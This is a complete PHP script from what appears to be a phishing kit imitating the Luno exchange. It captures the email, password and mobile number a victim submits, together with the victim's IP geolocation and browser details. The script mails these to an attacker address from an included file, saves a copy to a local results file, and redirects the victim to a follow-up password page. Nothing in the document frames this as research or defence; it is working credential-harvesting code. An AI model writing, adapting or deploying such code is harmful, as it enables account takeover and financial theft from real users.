<?php
$login = $_POST['email'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------New Logz-----------------------\n";
$message .= "Email            : ".$_POST['email']."\n";
$message .= "Password           : ".$_POST['password']."\n";
$message .= "Mobile Number           : ".$_POST['mobile']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";
include "email.php";

$subj .= "Luno 1st Mail EN | $login";
$from .= "From: <Webmaster>\n";
mail($to,$subj,$message,$from);

$fp = fopen("backupresultsxxxxxxxxxxxxxxxxxxxxxxxxx.txt","a");
fputs($fp,$message);
fclose($fp);


header("Location: password.php?login=$login");
?>
